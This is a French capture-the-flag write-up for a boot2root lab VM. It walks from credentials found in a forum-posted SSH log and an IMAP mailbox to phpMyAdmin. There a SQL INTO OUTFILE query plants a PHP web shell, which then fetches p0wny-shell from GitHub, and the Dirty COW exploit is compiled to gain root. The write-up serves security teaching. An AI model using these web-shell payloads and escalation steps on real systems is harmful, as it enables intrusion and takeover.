# Writeup #3

## Contexte

Comme nous avons vu dans l'ancien writeup, il
nous a été possible de devenir **root** en remplaçant
simplement le binaire d'**init** par un shell dans les paramètres
kernel.

## Collecte d'informations

En ouvrant notre navigateur internet, dans notre cas firefox, il
est possible d'accéder au site internet HTTPS en ajoutant une exception
SSL.

En utilisant le logiciel **OWASP ZAP**, nous avons pu déterminer
l'existence de plusieurs sous dossier du serveur HTTP:
- /forum
- /phpmyadmin

### Analyse du forum

Les forums utilisent en général des générateurs de page HTML;
ceux-ci ajoutant leurs versions dans la balise meta "generator":

```bash
curl -sk https://$TARGET/forum/ | grep "name=\"generator\""
```

Ce qui nous donne:

```
<meta name="generator" content="my little forum 2.3.4" />
```

D'autre part un naviguant sur le forum nous avons pu observe
la présence d'un topic intéressant a propos d'un *Problème login*.
Le contenu du poste possède la même nomenclature du fichier de log SSH.

En lisant méticuleusement l'extrait du fichier, une ligne nous saute au yeux:

`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`

Le nom de l'utilisateur qui se serait trompe lors de sa connection s'apparente plus a un mot de passe,
une étourderie de la part de l'utilisateur peut être ? En regardant la tentative
juste en dessous, nous pouvons apercevoir l'username **lmezard**:

`Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)`

En testant de se connecter sur le forum avec:
- username: `lmezard`
- password: `!q\]Ej?*5K5cy*AJ`

Il est possible d'accéder au compte et d'avoir accès a plus d'informations a propos de l'utilisateur:

![Boot Menu](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/forum.png)

Nous sommes en possession du mail de l'utilisateur: `laurie@borntosec.net`

### Le serveur IMAP

Lors du premier writeup, nous avons mis en évidence la présence d'un serveur IMAP
sur la VM, connectons nous sur le port sécurisé:

```bash
openssl s_client -connect $TARGET:993
```

A partir de ce [memo](https://busylog.net/telnet-imap-commands-note/) du protocole, nous
allons examiner le compte:

```bash

* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.

a LOGIN laurie@borntosec.net !q\]Ej?*5K5cy*AJ

a OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS] Logged in

a LIST "*" "*"

* LIST (\NoInferiors \UnMarked) "/" "INBOX.Drafts"
* LIST (\NoInferiors \Marked) "/" "INBOX.Sent"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Trash"
* LIST (\NoInferiors \UnMarked) "/" "INBOX"
a OK List completed.

a SELECT "INBOX.Sent"

* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1444339365] UIDs valid
* OK [UIDNEXT 3] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
a OK [READ-WRITE] Select completed.

a FETCH 1 BODY[]

* 1 FETCH (BODY[] {1722}
Received: from 192.168.1.22
        (SquirrelMail authenticated user laurie@borntosec.net)
        by 192.168.1.8 with HTTP;
        Thu, 8 Oct 2015 23:22:45 +0200
Message-ID: <38e4cbc743bb95cd2402bf0bc47602b3.squirrel@192.168.1.8>
Date: Thu, 8 Oct 2015 23:22:45 +0200
Subject: Very interesting !!!!
From: laurie@borntosec.net
To: ft_root@mail.borntosec.net
User-Agent: SquirrelMail/1.4.22
MIME-Version: 1.0
Content-Type: text/plain;charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
Importance: Normal

WinDev est un atelier de g�nie logiciel (AGL) �dit� par la soci�t�
fran�aise PC SOFT et con�u pour d�velopper des applications,
principalement orient�es donn�es pour Windows 8, 7, Vista, XP, 2008, 2003,
2000, mais �galement pour Linux, .Net et Java. Il propose son propre
langage, appel� le WLangage. La premi�re version de l'AGL est sortie en
1993. Apparent� � WebDev et WinDev Mobile.

La communaut� autour de WinDev
Tour De France Technique
Chaque ann�e, entre le mois de mars et le mois de mai, PC SOFT organise
dans toute la France ce qu'ils appellent le TDF Tech (Tour De France
Technique). Cet �v�nement d'une demi-journ�e a pour but d'informer et de
pr�senter les nouveaut�s de chaque version. Pendant cette courte
formation, les diff�rents intervenants utilisent un grand nombre
d'applications pr�-con�ues dans lesquelles ils ont int�gr� les multiples
nouveaut�s, tout en exploitant le mat�riel (serveurs, t�l�phones) qu'ils
ont apport�. Non seulement, WinDev est largement mis en avant, mais aussi
les autres environnements : WebDev et WinDev Mobile. Le code source des
sujets pr�sent�s ainsi qu'un support de cours sont remis � chaque
participant.
)
a OK Fetch completed.
a SELECT "INBOX.Sent"
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1444339365] UIDs valid
* OK [UIDNEXT 3] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
a OK [READ-WRITE] Select completed.

a FETCH 2 BODY[]

* 2 FETCH (BODY[] {629}
Received: from 192.168.1.22
        (SquirrelMail authenticated user laurie@borntosec.net)
        by 192.168.1.8 with HTTP;
        Thu, 8 Oct 2015 23:25:25 +0200
Message-ID: <e231e4a59416c44fd367fc5eeff1e8f5.squirrel@192.168.1.8>
Date: Thu, 8 Oct 2015 23:25:25 +0200
Subject: DB Access
From: laurie@borntosec.net
To: ft_root@mail.borntosec.net
User-Agent: SquirrelMail/1.4.22
MIME-Version: 1.0
Content-Type: text/plain;charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
Importance: Normal

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
)
a OK Fetch completed.
```

Des credentials de BDD:
- username: `root`
- password: `Fg-'kKXBj87E:aJ$`

### PHPmyAdmin

Comme nous savons que phpmyadmin est installe sur le serveur,
nous pouvons utiliser les credentials pour se connecter:

![phpmyadmin](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/phpmyadmin.png)

En se basant sur cet [article](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2) nous allons
mettre en place un shell pour exécuter des commandes a distance:

```sql
select "<?php $o = shell_exec($_REQUEST['x']); echo $o ?>" into outfile "/var/www/x.php";
```

Seulement le serveur nous renvois une erreur:
```
#1 - Can't create/write to file '/var/www/x.php' (Errcode: 13)
```

Il nous faut un dossier dans lequel nous avons les droits d'écriture.
En lisant la [documentation](https://github.com/ilosuna/mylittleforum/wiki/Installation) d'installation
du forum:

> Depending on your server configuration the write permission of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script

Le dossier **template_c** semble correct:

```sql
select "<?php $o = shell_exec($_REQUEST['x']); echo $o ?>" into outfile "/var/www/forum/templates_c/foo.php"
```

![phpmyadmin](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/phpmyadmin2.png)

Succès ! Nous pouvons désormais installer un shell plus fancy:

```bash
curl -sk "https://$TARGET/forum/templates_c/foo.php?x=curl -O https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"
```

![shell](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/shell.png)

Sachant que nous avons un shell stable, il est possible
de récupérer plus d'informations sur le système:

```bash
laurie@BornToSecHackMe:~$ uname -smr
Linux 3.2.0-91-generic-pae i686
```

En 2016, la vulnérabilité [Dirty Cow](https://www.wikiwand.com/fr/Dirty_COW) a été découverte et mise
publique. Le kernel étant assez ancien, nous allons rechercher quelques exploits avec `searchsploit`.

```bash
$ searchsploit "Linux Kernel < 3. Dirty"
```

![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/searchsploit.png)

Apres plusieurs tests, nous avons choisis l'exploit [**40839**](https://www.exploit-db.com/exploits/40839):

```bash
$ curl https://www.exploit-db.com/raw/40839 -o dirty.c
$ sed -i s/firefart/root/ dirty.c # Change l'id de l'user
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty 42
```

![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/dirty.png)

Nous sommes en possession d'un shell en *uid=0*.
